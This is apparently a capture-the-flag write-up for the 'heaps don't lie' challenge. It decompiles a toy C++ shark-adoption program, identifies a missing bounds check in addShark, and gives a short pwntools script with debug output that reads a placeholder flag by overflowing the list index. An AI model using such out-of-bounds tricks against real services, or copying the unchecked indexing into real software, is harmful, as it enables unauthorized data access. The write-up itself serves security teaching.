# heaps don't lie

This is a c++ application. Let's open it in IDA:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rbx
  __int64 v4; // rdx
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rdx
  int v10; // [rsp+8h] [rbp-28h] BYREF
  unsigned int v11; // [rsp+Ch] [rbp-24h] BYREF
  _QWORD *v12; // [rsp+10h] [rbp-20h]
  unsigned __int64 v13; // [rsp+18h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  std::operator<<<std::char_traits<char>>(&std::cout, "Welcome to the shark adoption center!\n", envp);
  v3 = (_QWORD *)operator new(0x20uLL);
  *v3 = 0LL;
  v3[1] = 0LL;
  v3[2] = 0LL;
  v3[3] = 0LL;
  Heap<20>::Heap(v3);
  v12 = v3;
  while ( 1 )
  {
    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "1. Register a shark\n", v4);
    v6 = std::operator<<<std::char_traits<char>>(v5, "2. Abandon a shark\n", v5);
    v7 = std::operator<<<std::char_traits<char>>(v6, "3. Pet a shark\n", v6);
    std::operator<<<std::char_traits<char>>(v7, "4. Buy flag\n", v7);
    std::istream::operator>>(&std::cin, &v10);
    if ( v10 == 4 )
      break;
    if ( v10 > 4 )
      goto LABEL_12;
    switch ( v10 )
    {
      case 3:
        std::operator<<<std::char_traits<char>>(&std::cout, "Shark number?\n", v8);
        std::istream::operator>>(&std::cin, &v11);
        Heap<20>::petShark(v12, v11);
        break;
      case 1:
        Heap<20>::addShark(v12);
        break;
      case 2:
        std::operator<<<std::char_traits<char>>(&std::cout, "You can't do that, sharks are too cool\n", v8);
        break;
      default:
LABEL_12:
        std::operator<<<std::char_traits<char>>(&std::cout, "invalid option!\n", v8);
        break;
    }
  }
  Heap<20>::buyFlag((__int64)v12);
  std::operator<<<std::char_traits<char>>(&std::cout, "...but nothing happened. Or...?\n", v9);
  goto LABEL_12;
}
```

We see the interesting `buyFlag` function:

```c
unsigned __int64 __fastcall Heap<20>::buyFlag(__int64 a1)
{
  __int64 v1; // rax
  char v3[520]; // [rsp+10h] [rbp-220h] BYREF
  unsigned __int64 v4; // [rsp+218h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(v3, "flag", 8LL);
  v1 = std::vector<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,std::allocator<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>>>::operator[](
         a1,
         20LL);
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(v3, v1);
  std::basic_ifstream<char,std::char_traits<char>>::close(v3);
  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(v3);
  return v4 - __readfsqword(0x28u);
}
```

We can see that it’s opening a file named `flag` and placing it in a vector at index 20

`addShark`:

```c
__int64 __fastcall Heap<20>::addShark(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  __int64 v4; // rdx
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 result; // rax

  std::operator<<<std::char_traits<char>>(&std::cout, "Name?\n", a3);
  v3 = std::vector<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,std::allocator<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>>>::operator[](
         a1,
         *(int *)(a1 + 24));
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, v3);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "Added shark ", v4);
  v6 = std::vector<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,std::allocator<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>>>::operator[](
         a1,
         *(int *)(a1 + 24));
  v7 = std::operator<<<char,std::char_traits<char>,std::allocator<char>>(v5, v6);
  v8 = std::operator<<<std::char_traits<char>>(v7, " with index ", v7);
  v9 = std::ostream::operator<<(v8, *(unsigned int *)(a1 + 24));
  std::operator<<<std::char_traits<char>>(v9, "\n", v9);
  result = a1;
  ++*(_DWORD *)(a1 + 24);
  return result;
}
```

This is just adding a shark at the current position. We also see no bounds check

`petShark`:

```c
__int64 __fastcall Heap<20>::petShark(__int64 a1, int a2, __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // rax

  if ( a2 >= *(_DWORD *)(a1 + 24) )
    return std::operator<<<std::char_traits<char>>(&std::cout, "The sharks are angry\n", a3);
  v4 = std::vector<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,std::allocator<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>>>::operator[](
         a1,
         a2);
  v5 = std::operator<<<char,std::char_traits<char>,std::allocator<char>>(&std::cout, v4);
  return std::operator<<<std::char_traits<char>>(v5, " is happy\n", v5);
}
```

If the shark exists, it writes “... is happy”, otherwise it writes “the sharks are angry”

In the main function the heap is instantiated with 20 elements, but we also remember that when adding a shark there are no bounds check. The `buyFlag` places the flag at index 20 in the shark list, so we can just add 21 sharks, call `buyFlag` then pet the shark with index 20:

```python
from pwn import *

context.log_level = 'debug'

elf = ELF("./heaps")

r = process("./heaps")

r.clean()
for i in range(21):
    r.sendline(b"1")
    r.clean()
    r.sendline(b"AAA")
    r.clean()
r.sendline(b"4")
r.clean()
r.sendline(b"3")
r.clean()
r.sendline(b"20")
flag = r.recvuntil(b"}")
log.success(f"{flag=}")
```

```bash
[*] '/home/toma/tfc/heaps-dont-lie/heaps'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './heaps' argv=[b'./heaps'] : pid 3782
[DEBUG] Received 0x68 bytes:
    b'Welcome to the shark adoption center!\n'
    b'1. Register a shark\n'
    b'2. Abandon a shark\n'
    b'3. Pet a shark\n'
    b'4. Buy flag\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x6 bytes:
    b'Name?\n'
[...]
[DEBUG] Received 0x56 bytes:
    b'FLAG{fake} is happy\n'
    b'1. Register a shark\n'
    b'2. Abandon a shark\n'
    b'3. Pet a shark\n'
    b'4. Buy flag\n'
[+] flag=b'FLAG{fake}'
[*] Stopped process './heaps' (pid 3807)
```